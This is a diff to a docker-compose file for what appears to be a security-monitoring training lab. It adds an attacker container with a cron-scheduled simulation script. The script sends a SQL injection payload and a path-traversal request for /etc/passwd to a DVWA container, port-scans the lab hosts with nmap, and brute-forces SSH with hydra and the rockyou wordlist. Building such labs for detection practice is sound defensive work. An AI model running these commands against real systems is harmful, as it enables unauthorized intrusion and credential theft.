@@ -116,7 +116,34 @@ services:
       - soc-net
     stdin_open: true
     tty: true
-    command: bash -c "apt-get update -qq && apt-get install -y -qq nmap hydra curl netcat-openbsd nikto sqlmap 2>/dev/null; tail -f /dev/null"
+    command: >
+      bash -c "
+        apt-get update -qq &&
+        apt-get install -y -qq nmap hydra curl netcat-openbsd nikto sqlmap cron 2>/dev/null &&
+        cat > /root/attack-sim.sh << 'SCRIPT'
+#!/bin/bash
+DVWA=victim-dvwa
+UBUNTU=victim-ubuntu
+FTP=victim-ftp
+log() { echo \"[\$(date +%Y-%m-%d\ %H:%M:%S)] \$1\"; }
+log === Attack simulation start ===
+log TA0001: Web attacks
+curl -s -o /dev/null \"http://\$DVWA/dvwa/vulnerabilities/sqli/?id=1+OR+1=1&Submit=Submit\" -H \"Cookie: security=low; PHPSESSID=x\" &
+curl -s -o /dev/null \"http://\$DVWA/../../../etc/passwd\" &
+wait && log TA0001: done
+log TA0007: Port scan
+nmap -sS -p 22,80,21,3306 \$UBUNTU \$DVWA \$FTP --max-retries 1 -T3 2>/dev/null &
+wait && log TA0007: done
+log TA0006: SSH brute force
+timeout 30 hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://\$UBUNTU 2>/dev/null | head -5
+log TA0006: done
+log === Attack simulation complete ===
+SCRIPT
+        chmod +x /root/attack-sim.sh &&
+        echo '*/30 * * * * /root/attack-sim.sh >> /var/log/attack-sim.log 2>&1' | crontab - &&
+        service cron start &&
+        tail -f /var/log/attack-sim.log
+      "
     restart: unless-stopped
   victim-database:
     build:
@@ -209,10 +236,11 @@ services:
     networks:
       - soc-net
     restart: unless-stopped
-    command: ["/run.sh"]
+    command: ["/entrypoint-webapi.sh"]
     volumes:
       - victim_webapi_mysql:/var/lib/mysql
       - ./wazuh-agent/wazuh-watchdog.sh:/tmp/wazuh-watchdog.sh:ro
+      - ./lab/victim-webapi/entrypoint-webapi.sh:/entrypoint-webapi.sh:ro
   victim-windows:
     build:
       context: ./lab/victim-windows
